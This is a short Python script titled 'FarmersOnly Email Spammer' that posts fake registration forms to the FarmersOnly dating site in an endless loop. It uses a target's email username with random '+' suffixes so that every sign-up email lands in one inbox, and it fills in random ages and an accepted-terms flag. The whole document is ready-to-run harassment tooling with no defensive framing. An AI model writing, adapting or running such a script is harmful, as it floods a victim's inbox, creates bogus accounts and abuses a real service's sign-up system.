import requests
import random
import os
import ctypes

email_username = '' # the part of the email before '@gmail.com' or '@hotmail.com'
zipc = '' # zipcode
count = 1
os.system('mode con: cols=75 lines=20')
ctypes.windll.kernel32.SetConsoleTitleW("FarmersOnly Email Spammer")



def get_num():
	global num
	global age
	num = '+' + str(random.randint(1000000000000,99999999999999999))
	age = str(random.randint(21,50)) # age of "person making account"
def doit():
	global count
	get_num()
	payload = {
		'registration[minAge]': '18',
		'registration[maxAge]': '99',
		'registration[email]': email_username + '{}@gmail.com'.format(num),
		'registration[zipcode]': zipc,
		'registration[genders]': 'MF',
		'registration[age]': age,
		'registration[acceptTerms]': '0',
		'registration[acceptTerms]': '1',
		'x': '221',
		'y': '44'
		}
	requests.post('https://www.farmersonly.com/', data=payload)
	os.system('cls')
	print('sent ' + str(count) +  ' emails')
	count += 1
while True:
 doit()
